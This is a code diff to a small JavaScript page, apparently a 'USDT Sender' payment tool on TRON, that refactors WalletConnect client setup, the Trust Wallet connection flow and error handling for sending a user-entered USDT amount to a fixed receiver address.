@@ -52,12 +52,12 @@ const USDT="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const RECEIVER="TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 const APP_URL=location.href;
 
-let client=null,session=null,address=null;
+let client=null, session=null, address=null;
 
 function setStatus(t){document.getElementById("status").innerText=t;}
 function short(a){return a.slice(0,6)+"..."+a.slice(-4);}
 
-// SAFE CLIENT
+// SAFE CLIENT DETECTION
 function getSignClient(){
   if(window.SignClient?.init) return window.SignClient;
   if(window.WalletConnectSignClient?.SignClient?.init) return window.WalletConnectSignClient.SignClient;
@@ -65,44 +65,57 @@ function getSignClient(){
   return null;
 }
 
+// 🔥 ENSURE CLIENT EXISTS (fix crash)
+async function ensureClient(){
+  if(client) return;
+
+  const SignClient=getSignClient();
+  if(!SignClient){
+    setStatus("Loading wallet...");
+    throw new Error("WalletConnect not loaded");
+  }
+
+  client=await SignClient.init({
+    projectId:PROJECT_ID,
+    metadata:{
+      name:"USDT Sender",
+      description:"TRON",
+      url:APP_URL,
+      icons:["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
+    }
+  });
+
+  // restore session
+  const sessions=client.session.getAll();
+  if(sessions.length){
+    session=sessions[0];
+    address=session.namespaces.tron.accounts[0].split(":")[2];
+    setStatus("Connected: "+short(address));
+  }
+}
+
 // INIT
 async function init(){
   try{
-    // Trust Wallet browser
     if(window.tronWeb?.defaultAddress?.base58){
       address=window.tronWeb.defaultAddress.base58;
       setStatus("Connected: "+short(address));
       return;
     }
 
-    const SignClient=getSignClient();
-    if(!SignClient) return;
+    await ensureClient();
 
-    client=await SignClient.init({
-      projectId:PROJECT_ID,
-      metadata:{
-        name:"USDT Sender",
-        description:"TRON",
-        url:APP_URL,
-        icons:["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
-      }
-    });
-
-    // restore session
-    const sessions=client.session.getAll();
-    if(sessions.length){
-      session=sessions[0];
-      address=session.namespaces.tron.accounts[0].split(":")[2];
-      setStatus("Connected: "+short(address));
-    }
-
-  }catch(e){console.error(e);}
+  }catch(e){
+    console.error(e);
+  }
 }
 
 // CONNECT
 async function connectWallet(){
   setStatus("Connecting wallet...");
-  
+
+  await ensureClient();
+
   const {uri,approval}=await client.connect({
     requiredNamespaces:{
       tron:{methods:["tron_signTransaction"],chains:[TRON_CHAIN],events:[]}
@@ -112,7 +125,7 @@ async function connectWallet(){
   if(uri){
     window.location.href="https://link.trustwallet.com/wc?uri="+encodeURIComponent(uri);
 
-    // Android return fix
+    // Android fix
     setTimeout(()=>{window.location.href=APP_URL;},2500);
   }
 
@@ -122,21 +135,19 @@ async function connectWallet(){
   setStatus("Connected: "+short(address));
 }
 
-// MAIN FLOW (🔥 UPDATED)
+// MAIN FLOW (ONE BUTTON)
 async function handleNext(){
   try{
     const amount=parseFloat(document.getElementById("amount").value);
     if(!amount) return alert("Enter amount");
 
-    // 🔹 Step 1: connect if needed
+    await ensureClient();
+
     if(!address){
       await connectWallet();
-
-      // wait for session
       await new Promise(r=>setTimeout(r,500));
     }
 
-    // 🔹 Step 2: send automatically
     if(address){
       setStatus("Preparing transaction...");
       await sendUSDT(amount);
@@ -144,6 +155,7 @@ async function handleNext(){
 
   }catch(e){
     console.error(e);
+    setStatus("Error occurred");
   }
 }
 
